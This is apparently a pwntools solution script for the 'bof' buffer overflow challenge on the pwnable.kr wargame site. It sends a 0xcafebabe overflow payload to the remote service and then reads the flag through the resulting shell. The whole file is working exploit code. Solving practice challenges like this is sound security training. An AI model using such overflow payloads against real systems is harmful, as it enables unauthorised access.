from pwn import *

exe = context.binary = ELF('bof')

io = remote('pwnable.kr', 9000)
#gdb.attach(io)
#io.recvuntil(b'overflow me : ')

payload = b'\xbe\xba\xfe\xca' * 14

io.sendline(payload)
io.sendline('cat flag')
print(io.recvline())